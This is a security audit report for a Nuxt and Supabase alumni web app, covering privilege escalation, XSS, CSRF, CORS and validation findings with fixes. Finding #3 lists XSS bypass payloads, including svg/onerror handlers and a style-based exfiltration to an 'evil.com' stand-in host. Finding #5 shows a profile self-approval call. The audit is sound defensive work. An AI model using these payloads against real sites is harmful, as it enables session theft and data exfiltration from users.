# Security Audit Report

**Date:** 2026-04-27 (updated)
**Scope:** Full application — Nuxt 4 + Supabase + PrimeVue + Resend email
**Branch:** `refactor/image-integration`

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 4 → 3 fixed |
| High | 3 → 1 fixed |
| Medium | 7 |
| Low / Informational | 4 |
| Passing | 8 |

---

## Critical

### 1. ~~Admin verification uses client-provided ID — privilege escalation~~ FIXED

**Status:** Fixed. All admin server routes now use `serverSupabaseClient(event)` + `getUser()` to extract the authenticated user's identity from the session cookie. Client-provided `adminId` / `admin_id` parameters have been removed from all request bodies and composable calls.

```ts
const { ids, adminId } = body
// ...
const { data: adminCheck } = await adminSupabase
  .from('admin_users')
  .select('id')
  .eq('id', adminId)  // Client-provided!
  .eq('is_active', true)
  .single()
```

**Attack:** Any authenticated user who knows (or guesses) a valid admin UUID can call these endpoints and impersonate that admin — approving members, rejecting applications, suspending accounts, or creating new members. Admin UUIDs could be discovered via network inspection or the directory.

**Impact:** Complete privilege escalation. A regular member can perform any admin action.

**Remediation:** Extract the authenticated user's identity from the Supabase auth session (cookie/header), not from the request body:

```ts
import { serverSupabaseUser } from '#supabase/server'

export default defineEventHandler(async (event) => {
  const user = await serverSupabaseUser(event)
  if (!user?.id) throw createError({ statusCode: 401, statusMessage: 'Not authenticated' })

  const adminSupabase = createClient(supabaseUrl, serviceKey)
  const { data: adminCheck } = await adminSupabase
    .from('admin_users')
    .select('id')
    .eq('id', user.id)  // From auth session, not body
    .eq('is_active', true)
    .single()
  // ...
})
```

---

### 2. ~~Change-password endpoint accepts client-provided userId — account takeover~~ FIXED

**Status:** Fixed. The endpoint now uses `serverSupabaseClient(event)` + `getUser()` to identify the caller. The `userId` parameter has been removed from the request body. Users can only change their own password.

The endpoint accepts `userId` from the request body and uses it to look up the target account:

```ts
const { currentPassword, newPassword, userId } = body
// ...
const { data: profile } = await adminSupabase
  .from('alumni_profiles')
  .select('email')
  .eq('id', userId)  // Client-controlled
  .single()
```

**Attack:** An attacker who knows another member's email and current password (e.g., from a credential breach) can change that member's password by providing their `userId`. The endpoint does verify the current password — but against the *target* user, not the *caller*. There's no check that the caller is the same person whose password is being changed.

**Impact:** Account takeover if an attacker has any member's credentials.

**Remediation:** Same as #1 — extract user identity from the auth session:

```ts
const user = await serverSupabaseUser(event)
if (!user?.id) throw createError({ statusCode: 401, statusMessage: 'Not authenticated' })

const { data: profile } = await adminSupabase
  .from('alumni_profiles')
  .select('email')
  .eq('id', user.id)  // Always the authenticated user
  .single()
```

---

### 3. XSS risk — incomplete sanitization on input, none on render

The app has a custom rich text editor (`app/components/shared/RichTextEditor.vue`) with a built-in `sanitizeHtml()` function. This is a good start, but has two structural problems and several bypass gaps.

**Structural problems:**

1. **Sanitization only runs on blur in the editor** (line 175–185) — not when content is saved, and not when content is rendered on public pages. If malicious HTML reaches the database through any path (direct DB edit, API manipulation, future import feature), it renders unsanitized via `v-html`.

2. **No render-time sanitization** — all 5 `v-html` bindings render raw database content:

| File | Line | Binding |
|------|------|---------|
| `app/pages/news/[slug].vue` | 72 | `v-html="article.content"` |
| `app/pages/jobs/[slug].vue` | 80 | `v-html="job.description"` |
| `app/pages/jobs/[slug].vue` | 84 | `v-html="job.requirements"` |
| `app/pages/jobs/[slug].vue` | 88 | `v-html="job.benefits"` |
| `app/pages/events/[slug].vue` | 89 | `v-html="event.content"` |

**Sanitizer bypass gaps** (`RichTextEditor.vue:134–153`):

The current sanitizer uses a blocklist approach — it removes known-dangerous tags and attributes. This misses many vectors:

| Vector | Status | Example |
|--------|--------|---------|
| `<script>`, `<iframe>`, `<object>`, `<embed>` | Blocked | — |
| `onclick`, `onerror`, `onload`, `onmouseover`, `onmouseout`, `onfocus`, `onblur` | Blocked | — |
| `javascript:` in `href` | Blocked | — |
| `<svg onload="...">` | **NOT blocked** | `<svg onload="alert(1)">` |
| `<svg><script>` (nested) | **NOT blocked** | `<svg><script>alert(1)</script></svg>` |
| `<math>` with embedded handlers | **NOT blocked** | `<math><mi onclick="...">` |
| 50+ event handlers beyond the 7 listed | **NOT blocked** | `onanimationstart`, `ontransitionend`, `onpointerover`, etc. |
| `<a href="data:text/html,...">` | **NOT blocked** | Data URI HTML injection |
| `<style>` injection | **NOT blocked** | `<style>*{background:url(//evil.com/steal?...)}</style>` |
| `<base>` tag hijacking | **NOT blocked** | `<base href="//evil.com/">` redirects all relative URLs |
| `<meta http-equiv="refresh">` | **NOT blocked** | Auto-redirect users |

**Additional XSS vectors in RichTextEditor:**

- **Alt text injection** (line ~360): `imageAlt.value` is interpolated unescaped into HTML: `` alt="${imageAlt.value}" ``. A value containing `"` breaks the attribute and injects arbitrary attributes.
- **Link text injection** (line ~270): `linkText.value` is inserted as raw HTML inside an `<a>` tag, allowing nested HTML injection: `<img src=x onerror="alert(1)">`

**Impact:** Stored XSS — attacker-controlled scripts run in authenticated user sessions, can steal tokens, impersonate users, or exfiltrate data.

**Remediation (two-layer fix):**

**Layer 1 — Replace custom sanitizer with DOMPurify in the editor:**

```bash
pnpm add dompurify
pnpm add -D @types/dompurify
```

```ts
import DOMPurify from 'dompurify'

function sanitizeHtml(html: string): string {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: [
      'b', 'i', 'em', 'strong', 'u', 's', 'a', 'p', 'br', 'span',
      'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4',
      'blockquote', 'code', 'pre', 'img', 'hr', 'div',
    ],
    ALLOWED_ATTR: [
      'href', 'target', 'rel', 'src', 'alt', 'class', 'style',
      'width', 'height', 'data-align',
    ],
    ALLOW_DATA_ATTR: false,
  })
}
```

**Layer 2 — Add render-time sanitization on every `v-html` page:**

```ts
// composables/useSanitize.ts
import DOMPurify from 'dompurify'
export function useSanitize() {
  function sanitizeHTML(dirty: string | null | undefined): string {
    if (!dirty) return ''
    return DOMPurify.sanitize(dirty, { /* same config */ })
  }
  return { sanitizeHTML }
}
```

Also escape alt text and link text in the editor:
```ts
const altAttr = imageAlt.value ? ` alt="${imageAlt.value.replace(/"/g, '&quot;')}"` : ' alt=""'
```

---

### 4. ~~Registration endpoint — no input validation, no rate limiting~~ FIXED

**Status:** Fixed. The endpoint now uses Zod schema validation for all fields (email format + lowercase normalization, password 8–128 chars, full_name 2–100 chars trimmed, batch_year integer 1900–current year, phone regex, student_id max 50). Rate limiting added at 1 request per 60s per email. "Already registered" error replaced with generic "Registration failed" to prevent email enumeration. Orphaned auth user cleanup now logs errors.

**File:** `server/api/auth/register.post.ts`

| Issue | Detail |
|-------|--------|
| Email validation | Only truthy check — any string accepted |
| Password strength | No server-side enforcement (frontend has 8-char check, but can be bypassed) |
| batch_year | `Number(batch_year)` accepts negative numbers, decimals, year 9999, etc. |
| phone | No format validation — any string stored |
| student_id | No length or format constraint |
| Rate limiting | None — unlimited registrations from a single IP |
| Error leakage | "already registered" response reveals whether an email exists in the system |
| email_confirm | Set to `true` (auto-confirms) — users register with fake/disposable emails |

**Impact:** Registration spam/abuse, enumeration of existing email addresses, storage of malformed data.

**Remediation:**

```ts
import { z } from 'zod'

const registrationSchema = z.object({
  email: z.string().email().toLowerCase().max(255),
  password: z.string().min(8).max(128),
  full_name: z.string().min(2).max(100).trim(),
  batch_year: z.number().int().min(1900).max(new Date().getFullYear()).optional(),
  student_id: z.string().max(50).optional(),
  phone: z.string().regex(/^\+?[\d\s\-()]{7,20}$/).optional(),
})
```

Replace "already registered" error with a generic "Registration failed" to prevent enumeration. Add in-memory rate limiting (same pattern as `forgot-password.post.ts`).

---

## High

### 5. ~~RLS allows alumni to self-approve — field-level escalation~~ FIXED

**Status:** Fixed via migration `014_protect_profile_sensitive_fields.sql`. A `BEFORE UPDATE` trigger on `alumni_profiles` silently reverts changes to `status`, `approved_by`, `approved_at`, and `is_verified` for non-admin, non-service-role users. Service role (server API routes) and admin users are exempt.

```sql
CREATE POLICY "Alumni update own profile" ON alumni_profiles FOR UPDATE
  USING (auth.uid() = id) WITH CHECK (auth.uid() = id);
```

This policy allows an alumni to update ANY column on their own profile row, including `status`, `approved_by`, `approved_at`, and `is_verified`.

**Attack:** A pending member can self-approve via the Supabase client:

```ts
await supabase.from('alumni_profiles')
  .update({ status: 'active', approved_by: 'any-uuid', approved_at: new Date().toISOString() })
  .eq('id', myUserId)
```

**Impact:** Bypasses the entire admin approval flow.

**Remediation:** Restrict updatable columns at the RLS level:

```sql
DROP POLICY "Alumni update own profile" ON alumni_profiles;
CREATE POLICY "Alumni update own profile" ON alumni_profiles FOR UPDATE
  USING (auth.uid() = id)
  WITH CHECK (
    auth.uid() = id
    AND status IS NOT DISTINCT FROM (SELECT status FROM alumni_profiles WHERE id = auth.uid())
    AND approved_by IS NOT DISTINCT FROM (SELECT approved_by FROM alumni_profiles WHERE id = auth.uid())
    AND approved_at IS NOT DISTINCT FROM (SELECT approved_at FROM alumni_profiles WHERE id = auth.uid())
    AND is_verified IS NOT DISTINCT FROM (SELECT is_verified FROM alumni_profiles WHERE id = auth.uid())
  );
```

Or use a SECURITY DEFINER function that only allows updates to safe columns.

---

### 6. No CSRF / origin validation on server routes

**File:** All `server/api/**/*.post.ts` routes

None of the POST endpoints validate the `Origin` or `Referer` header. A malicious site could submit forms to these endpoints on behalf of a visiting user.

Routes affected: `register.post.ts`, `forgot-password.post.ts`, `change-password.post.ts`, `approve.post.ts`, `reject.post.ts`, `suspend.post.ts`, `admin-create-member.post.ts`.

**Impact:** Cross-site registration abuse, password changes, admin actions.

**Remediation:**

```ts
export default defineEventHandler(async (event) => {
  const origin = getHeader(event, 'origin')
  const config = useRuntimeConfig()
  const allowed = [config.public.siteUrl]

  if (!origin || !allowed.includes(origin)) {
    throw createError({ statusCode: 403, statusMessage: 'Forbidden' })
  }
  // ...
})
```

---

### 7. Missing explicit Supabase cookie configuration

**File:** `nuxt.config.ts` (lines 51–58)

No `cookieOptions` defined — relies on `@nuxtjs/supabase` module defaults. In production, cookies should be explicitly configured.

| Attribute | Default | Recommended |
|-----------|---------|-------------|
| `secure` | varies | `true` (HTTPS only) |
| `httpOnly` | varies | `true` (not accessible to JS) |
| `sameSite` | `Lax` | `Lax` or `Strict` |
| `maxAge` | module default | Explicit value (e.g., 7 days) |

**Remediation:**

```ts
supabase: {
  redirect: false,
  redirectOptions: { /* ... */ },
  cookieOptions: {
    maxAge: 60 * 60 * 24 * 7,
    secure: true,
    sameSite: 'lax',
  },
}
```

---

## Medium

### 8. ~~Email case normalization inconsistency~~ PARTIALLY FIXED

**Status:** Registration now normalizes email to lowercase via Zod `.transform(v => v.toLowerCase().trim())`. The case-insensitive unique index on the database is still recommended to enforce this at the DB level.

**Files:** `server/api/auth/register.post.ts` vs `server/api/auth/forgot-password.post.ts`

Registration stores emails as provided (no normalization), while forgot-password normalizes to lowercase before querying:

```ts
// register.post.ts — stored as-is
.insert({ email, ... })

// forgot-password.post.ts — normalized
const normalizedEmail = email.toLowerCase().trim()
.eq('email', normalizedEmail)
```

**Impact:** If a user registers with `John@Example.com`, the forgot-password query for `john@example.com` won't find them (PostgreSQL string comparison is case-sensitive by default).

**Remediation:** Normalize email to lowercase in the registration route:

```ts
const normalizedEmail = email.toLowerCase().trim()
```

And add a migration for a case-insensitive unique index:

```sql
CREATE UNIQUE INDEX alumni_profiles_email_lower ON alumni_profiles (LOWER(email));
```

---

### 9. CORS enabled globally without origin restriction

**File:** `nuxt.config.ts` (line 92)

```ts
routeRules: {
  '/api/**': { cors: true },
}
```

This enables CORS for ALL API routes without specifying allowed origins, methods, or headers.

**Impact:** Any website can make cross-origin requests to all API endpoints.

**Remediation:**

```ts
routeRules: {
  '/api/**': {
    cors: {
      origin: ['https://yourdomain.com'],
      methods: ['GET', 'POST'],
      credentials: true,
    },
  },
}
```

---

### 10. Pages accessible without middleware (RLS-only protection)

These pages query member-restricted tables but have no route middleware. Supabase RLS correctly blocks data access for unauthenticated users, so they see empty lists — but there is no redirect to login.

| Page | Current protection | Recommendation |
|------|--------------------|----------------|
| `app/pages/news/index.vue` | RLS only | Add `member-auth` middleware |
| `app/pages/jobs/index.vue` | RLS only | Add `member-auth` middleware |
| `app/pages/events/index.vue` | RLS only | Add `member-auth` middleware |

**Note:** Migration 005 changed event RLS to require `is_active_alumni()`, meaning unauthenticated users see nothing. Either add middleware or revert the RLS policy to allow public read of published events.

---

### 11. Client-side mutations lack input length / format validation

Composable functions accept user input and pass it to Supabase without length caps.

| File | Function | Issue |
|------|----------|-------|
| `app/composables/useFeed.ts` | `createPost()` | No content length limit |
| `app/composables/useFeed.ts` | `addComment()` | No content length limit |
| `app/composables/useMembers.ts` | `fetchDirectory()` | Search string unbounded |
| `app/composables/useNews.ts` | `fetchArticles()` | Search string unbounded |
| `app/composables/useJobs.ts` | `fetchJobs()` | Search string unbounded |

**Note:** Supabase PostgREST parameterizes all queries, so this is not an injection risk — it's an abuse/DoS concern from oversized payloads.

---

### 12. Middleware error handling gaps

**Files:** `app/middleware/member-auth.ts`, `app/middleware/admin-auth.ts`

If the Supabase query fails (network error, Supabase outage), `data` is null. The current code does not distinguish "query failed" from "user not found":

```ts
const { data } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()
if (!data) return navigateTo('/login')  // Both "not found" and "query error"
```

**Impact:** On Supabase outage, users are silently redirected to login instead of seeing a service error. No error logging.

**Remediation:**

```ts
const { data, error } = await supabase.from('alumni_profiles').select('status').eq('id', user.id).single()
if (error || !data) {
  console.error('Auth middleware: profile query failed', error)
  return navigateTo('/login')
}
```

---

### 13. File upload MIME type validation is client-side only

**File:** `app/composables/useImageUpload.ts`

File type is checked against `file.type`, which is client-controlled and can be spoofed. No server-side file type validation exists — Supabase Storage stores whatever it receives.

**Impact:** An attacker could upload non-image files (HTML, SVG with scripts, etc.) to image buckets. If these are served with incorrect Content-Type headers, they could execute scripts.

**Remediation:** Add Supabase Storage bucket-level file type restrictions via the dashboard, or add server-side validation using magic bytes.

---

### 14. `redirect: false` in Supabase config — developer risk

**File:** `nuxt.config.ts` (line 52)

With `redirect: false`, every new protected page MUST remember to add `middleware: 'member-auth'` or `middleware: 'admin-auth'`. If a developer forgets, the page is unprotected (except by RLS).

**Recommendation:** Document the requirement clearly, or consider switching to `redirect: true` for an additional safety net.

---

## Low / Informational

### 15. Forgot-password rate limiting is in-memory only

**File:** `server/api/auth/forgot-password.post.ts`

The rate limit uses an in-memory `Map`, which resets on server restart and doesn't work across multiple server instances.

**Impact:** Low in single-instance deployments. In scaled deployments, each instance has its own rate limit state.

**Recommendation:** Acceptable for now. If scaling to multiple instances, switch to Redis or Supabase-backed rate limiting.

---

### 16. Registration auto-confirms email

**File:** `server/api/auth/register.post.ts` (line ~26)

```ts
email_confirm: true // auto-confirms without actual email verification
```

Users can register with fake emails. Partially mitigated by admin approval flow.

**Recommendation:** Set `email_confirm: false` if email verification is desired, or accept the risk given admin approval is required.

---

### 17. Partial failure cleanup in registration silently swallows errors

**File:** `server/api/auth/register.post.ts` (line ~56)

```ts
await adminSupabase.auth.admin.deleteUser(userId).catch(() => {})
```

**Impact:** Orphaned auth users without profiles. Low probability.

**Recommendation:** Log the cleanup failure.

---

### 18. Devtools enabled unconditionally

**File:** `nuxt.config.ts` (line 6)

```ts
devtools: { enabled: true }
```

Nuxt DevTools should be disabled in production builds to prevent information disclosure.

**Remediation:**

```ts
devtools: { enabled: process.env.NODE_ENV !== 'production' }
```

---

## Passing (no issues found)

| Area | Status |
|------|--------|
| `.env` not tracked in git | `.gitignore` correctly excludes `.env`. Verified via `git ls-files`. |
| Service role key server-only | Key is in `runtimeConfig` (not `runtimeConfig.public`). Not exposed to client bundle. |
| Resend API key server-only | `resendApiKey` is in `runtimeConfig` (server-only). Never accessible from client. |
| RLS policy coverage | Comprehensive policies on all tables. Helper functions use `SECURITY DEFINER` to prevent recursion. |
| Middleware uses reliable auth check | Both middlewares use `supabase.auth.getUser()` (async server call), not the unreliable `useSupabaseUser()` reactive ref. |
| Email notifications fail silently | `sendEmail()` never throws — email failures don't block registration, approval, or other operations. |
| No service role key on client | Grep confirms key only appears in `.env`, `.env.example`, `nuxt.config.ts`, and `server/api/` routes. |
| Password reset has rate limiting | `forgot-password.post.ts` implements 60s per-email cooldown and returns generic message (no user enumeration). |

---

## Recommended action plan (priority order)

| Priority | Action | Effort | Findings |
|----------|--------|--------|----------|
| ~~1~~ | ~~**Fix admin verification** — extract user ID from auth session, not request body~~ | ~~2 hours~~ | ~~#1, #2~~ DONE |
| ~~2~~ | ~~**Fix RLS self-approval** — restrict alumni from updating sensitive columns~~ | ~~1 hour~~ | ~~#5~~ DONE |
| 3 | **Install DOMPurify** — replace custom sanitizer + add render-time sanitization | ~1.5 hours | #3 |
| 4 | **Add CSRF / origin validation** to all POST server routes | ~1 hour | #6 |
| ~~5~~ | ~~**Add Zod validation + rate limiting** to registration endpoint~~ | ~~1.5 hours~~ | ~~#4~~ DONE |
| 6 | **Normalize emails** to lowercase in registration + add case-insensitive index | ~30 min | #8 |
| 7 | **Configure Supabase cookies** and restrict CORS origins | ~30 min | #7, #9 |
| 8 | **Add middleware** to unprotected member pages | ~15 min | #10 |
| 9 | **Add input length validation** to composable mutations | ~1 hour | #11 |
| 10 | **Fix middleware error handling** — log errors, distinguish query failure from not-found | ~30 min | #12 |
| 11 | **Disable devtools in production** | ~5 min | #18 |
